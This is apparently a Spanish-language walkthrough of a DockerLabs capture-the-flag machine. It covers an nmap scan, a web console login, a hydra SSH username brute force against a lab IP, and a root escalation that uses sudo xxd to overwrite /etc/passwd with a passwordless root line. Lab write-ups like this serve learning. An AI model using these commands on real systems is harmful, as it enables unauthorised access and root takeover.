nmap: 22,80

![image](https://github.com/user-attachments/assets/28eb06bd-22a9-4d2e-be09-2177f3826681)

entramos al puerto 80

![image](https://github.com/user-attachments/assets/8c83f0ba-3079-487e-b448-ec8f37ff43ea)

si no tenemos entramos a esta pagina:

![image](https://github.com/user-attachments/assets/1b89a79e-1d5a-4517-b6bb-d6a16b3c4f5b)

buscando vi que en la pagina da como paso a paso pero me da: 

![image](https://github.com/user-attachments/assets/7c8eb49a-2e3e-402a-b2b2-d4e30f3faba4)

entramos a esa pagina

![image](https://github.com/user-attachments/assets/c62698a4-609f-436c-b502-d382473cfe74)

vemos que da un usuario y contraseña en la primera linea así que intentamos ingresar en el primer recuadro, si probamos "chocolate:chocolate" vemos que tenemos exito

![image](https://github.com/user-attachments/assets/cefac903-03c9-4b4c-85e6-96b1113e6400)

y ahora la consola aparece así

![image](https://github.com/user-attachments/assets/783449d9-f338-4c6f-bb97-8da5038ead2f)

no encontré nada mas, solo que podemos ejecutar comandos en la consola pero nada útil realmente. así que pobre hacer una fuerza bruta a "baluleroh" 

     hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p baluleroh -V ssh://172.17.0.2 

y me dio

![image](https://github.com/user-attachments/assets/0952207a-3e56-45f8-81cd-b78424d74017)

como ya ingresamos por la consola ahora probamos por el ssh y tenemos exito

![image](https://github.com/user-attachments/assets/04cb4936-b9f9-4e40-868b-e22dda8e6996)

al hacer sudo -l da dos: ping y xxd. de ping no encontré pero de xxd encontre en https://gtfobins.github.io/gtfobins/xxd/#sudo 

![[sudo.png]]

buscando como tirar ese comando encontré este comando para borrar la "x" de "/etc/passwd" y así pasar a root sin contraseña

     echo root::0:0:root:/root:/bin/bash | sudo xxd | sudo xxd -r - "/etc/passwd"

![[dockerlabs/medio/devtools/root.png]]

como vemos somos root!
